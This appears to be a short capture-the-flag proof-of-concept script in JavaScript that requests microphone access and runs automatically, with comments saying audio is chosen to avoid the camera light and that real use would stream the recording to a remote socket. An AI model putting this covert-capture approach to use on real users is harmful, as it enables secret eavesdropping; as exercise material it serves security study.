// Mission 002: Browser Sensor Hijack (PoC)
async function startSecretStream() {
    try {
        // Requesting audio only to be less "noticeable" than a camera light
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
        
        console.log("Access Granted. Capturing...");

        // In a real CTF, we stream this data to a remote socket
        // For this PoC, we just prove the 'Permission State'
        const audioContext = new AudioContext();
        console.log("FLAG{Bypassed_User_Interaction_via_Stored_Permission}");
        
    } catch (err) {
        console.log("Access Denied: " + err.name);
    }
}

// Triggering the hijack
startSecretStream();
